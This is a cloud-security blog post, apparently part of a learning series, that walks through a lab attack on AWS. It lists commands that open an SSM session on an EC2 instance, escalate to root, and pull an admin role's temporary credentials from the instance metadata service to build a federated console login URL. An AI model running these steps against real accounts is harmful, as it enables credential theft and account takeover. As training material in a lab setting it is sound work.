---
title: '100 Days of Cloud Security - Day 19: Attack — `federated_console_takeover`'
date: '2025-11-28'
author: 'Venkata Pathuri'
excerpt: 'Day 19 of my cloud security journey - Attack — `federated_console_takeover`'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 19: Attack — `federated_console_takeover`

## Overview
Welcome back to our cloud security learning journey! Today, we delve into the fascinating world of AWS security, specifically focusing on the `federated_console_takeover` attack. This scenario builds on our previous discussions surrounding IAM roles and EC2 instances, taking a step further into understanding how attackers can leverage AWS services to gain unauthorized access. By the end of this session, you’ll not only comprehend the mechanics behind this attack but also gain hands-on experience in executing it safely within a controlled environment.

## Learning Objectives
In today’s exploration, you will master the art of leveraging AWS roles and EC2 instances to achieve a federated console takeover. You will learn how to access temporary credentials, utilize the Instance Metadata Service (IMDS), and create a federated login URL that grants privileged access to the AWS Management Console. Through this exercise, you will gain a deeper understanding of AWS security mechanisms and the vulnerabilities that can arise from misconfigured roles and permissions.

## Deep Dive
To begin, let's explore the foundation of today’s exercise: the EC2 instance and IAM roles. When instances are launched in AWS, they can be associated with IAM roles through instance profiles. These roles dictate what actions the instance can perform and what resources it can access. In our scenario, we discovered a role named **cg-ec2-admin-role-cgider3i4ko5kq**, which provides administrative privileges over EC2 resources.

The first step in our attack was to confirm our identity and permissions using the command:
```bash
aws sts get-caller-identity --profile cg
```
This command returns your current IAM user details, which is crucial for understanding your starting point.

Next, we listed the IAM roles available to us:
```bash
aws iam list-roles --profile cg
```
Among the roles, we found the **cg-ec2-admin-role-cgider3i4ko5kq**. This role can be assumed by the EC2 instance, allowing it to obtain temporary credentials for privileged access. If you can access the instance's metadata, you can retrieve these credentials, leading you toward a potential takeover of the AWS console.

Once we confirmed the EC2 instance was running and accessible, we connected to it using AWS Systems Manager (SSM):
```bash
aws ssm start-session --target i-0fc11732d00710280 --profile cg --region us-east-1
```
This command initiated a session, granting us access as `ssm-user`. Interestingly, the `ssm-user` role had no restrictions, enabling us to escalate to the root user using `sudo -i`.

The next critical component of this attack is the Instance Metadata Service (IMDS). We fetched an IMDSv2 session token:
```bash
curl -sX PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```
This secure token helped us mitigate common SSRF (Server-Side Request Forgery) risks associated with unauthorized metadata access.

To retrieve the role's security credentials, we executed:
```bash
curl -s -H "X-aws-ec2-metadata-token: [your_token]" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
This provided us the necessary temporary credentials for the `cg-ec2-admin-role-cgider3i4ko5kq`. By saving these credentials in an AWS credentials file, we could run a script to generate a federated login URL, effectively granting us access to the AWS Management Console as an admin.

## Hands-On Practice
Follow these steps to replicate the `federated_console_takeover` scenario:

1. **Get Caller Identity**: 
   ```bash
   aws sts get-caller-identity --profile cg
   ```
   *You should see your UserId and Account details.*

2. **List IAM Roles**:
   ```bash
   aws iam list-roles --profile cg
   ```
   *Identify the role with admin privileges.*

3. **Describe EC2 Instances**:
   ```bash
   aws ec2 describe-instances --profile cg
   ```
   *Locate the instance ID and its associated instance profile.*

4. **Start SSM Session**:
   ```bash
   aws ssm start-session --target [your_instance_id] --profile cg --region us-east-1
   ```
   *You will be logged in as `ssm-user`.*

5. **Request IMDSv2 Token**:
   ```bash
   curl -sX PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
   ```

6. **Retrieve Role Credentials**:
   ```bash
   curl -s -H "X-aws-ec2-metadata-token: [your_token]" http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-admin-role-cgider3i4ko5kq
   ```

7. **Run the Script**:
   ```bash
   ./aws_signin_url.sh [profile]
   ```
   *This will generate your federated login URL.*

**Common Troubleshooting Tips**:
- Ensure your IAM user has the necessary permissions for SSM and EC2 actions.
- Check security group settings if you are unable to connect to the instance.
- Verify the instance profile is correctly associated with your EC2 instance.

## Key Takeaways
Today, we explored the mechanics behind the `federated_console_takeover` attack, revealing how misconfigured IAM roles can lead to significant security vulnerabilities in cloud environments. By leveraging temporary credentials and the Instance Metadata Service, we demonstrated how attackers could escalate privileges and gain access to critical resources. Understanding these concepts not only empowers you to recognize potential security pitfalls but also equips you with the tools necessary to fortify your AWS infrastructure against such attacks.

## Real-World Applications
In production environments, these concepts are vital for securing AWS accounts. Organizations must ensure that IAM roles are configured with the principle of least privilege, minimizing access to only what is necessary. Regular audits of EC2 instance roles and the use of IMDSv2 can significantly reduce the risk of unauthorized privilege escalation. Additionally, implementing robust monitoring and alerting mechanisms can help detect unusual access patterns, allowing for timely intervention.

---
**Journey Progress:** 19/100 Days Complete 🚀